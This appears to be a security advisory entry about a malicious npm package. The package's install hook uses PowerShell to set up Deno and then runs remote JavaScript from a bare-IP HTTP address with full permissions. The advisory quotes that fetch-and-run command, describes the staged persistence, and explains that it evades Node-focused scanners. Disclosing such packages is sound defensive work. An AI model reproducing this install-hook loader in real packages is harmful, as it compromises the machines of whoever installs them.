summary: npm install hook fetches and executes remote code from bare-IP HTTP endpoint via Deno
details: package.json declares scripts.install = 'node setup.js', which runs automatically on npm install. setup.js spawns PowerShell (child_process.exec) and installs Scoop, winget, and Deno on the installer's host if missing, then invokes `deno run -A http://172.94.9.157/v028f8cde892b0b74c8.js` — executing attacker-controlled JavaScript over plain HTTP from a bare IP with full Deno permissions (-A). Comments in setup.js describe the fetched code as a 'launcher-1' eval-loop that fetches a further stage which 'sets up autorun and runs main', indicating multi-stage loading and persistence. Staging an alternate runtime (Deno) solely to execute remote code evades Node-focused scanners. The name resembles a legitimate WordPress/Tailwind block package, but the shipped install script performs none of that work.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
